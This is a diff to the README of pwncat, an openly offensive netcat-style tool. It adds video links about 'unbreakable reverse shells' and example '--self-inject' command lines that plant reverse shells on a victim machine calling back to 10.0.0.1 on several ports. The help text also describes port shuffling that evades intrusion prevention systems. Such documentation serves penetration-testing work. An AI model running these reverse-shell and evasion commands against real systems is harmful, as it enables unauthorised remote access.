@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.30%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.40%)</strong></sup><br/>
 > <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
 
 
@@ -159,6 +159,22 @@ pip install pwncat
 ## :coffee: TL;DR
 
 This is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.
+
+### See in action
+
+<table>
+ <tr>
+  <td widht="50%" style="text-align:center;">
+   <a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s">unbreakable reverse shells - how to spawn</a><br/><br/>
+   <a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s"><img src="docs/img/video01.png" /></a>
+  </td>
+  <td widht="50%" style="text-align:center;">
+   <a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2">unbreakable reverse shells - multiple shells</a><br/><br/>
+   <a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img src="docs/img/video02.png" /></a>
+  </td>
+ </tr>
+</table>
+
 
 ### Deploy to target
 ```bash
@@ -432,7 +448,7 @@ optional arguments:
                         color on Windows by default. (default: auto)
 
 command & control arguments:
-  --self-inject cmd:host:port
+  --self-inject cmd:host:port[s]
                         Listen mode (TCP only):
                         If you are about to inject a reverse shell onto the
                         victim machine (via php, bash, nc, ncat or similar),
@@ -442,6 +458,11 @@ command & control arguments:
                         pwncat reverse shell onto the victim machine which then
                         also connects back to you with specified arguments.
                         Example: '--self-inject /bin/bash:10.0.0.1:4444'
+                        It is also possible to launch multiple reverse shells by
+                        specifying multiple ports.
+                        Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
+                        Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
+                        Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
                         Note: this is currently an experimental feature and does
                         not work on Windows remote hosts yet.
 
@@ -505,8 +526,9 @@ advanced arguments:
   --rebind-robin port   Listen mode (TCP and UDP):
                         If the server is unable to initialize (e.g: cannot bind
                         and --rebind is specified, it it will shuffle ports in
-                        round-robin mode to bind to. Use comma separated string
-                        such as '80,81,82' or a range of ports '80-100'.
+                        round-robin mode to bind to.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Set --rebind to at least the number of ports to probe +1
                         This option requires --rebind to be specified.
 
@@ -527,8 +549,8 @@ advanced arguments:
                         If the remote server is not reachable or the connection
                         is interrupted and --reconn is specified, the client
                         will shuffle ports in round-robin mode to connect to.
-                        Use comma separated string such as '80,81,82' or a range
-                        of ports '80-100'.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Set --reconn to at least the number of ports to probe +1
                         This helps reverse shell to evade intrusiona prevention
                         systems that will cut your connection and block the
@@ -576,6 +598,8 @@ advanced arguments:
                         Instruct the client to shuffle the specified ports in
                         round-robin mode for a remote server to ping.
                         This might be handy to scan outbound allowed ports.
+                        Use comma separated string such as '80,81,82,83', a range
+                        of ports '80-83' or an increment '80+3'.
                         Use --ping-intvl 0 to be faster.
 
   --safe-word str       All modes:
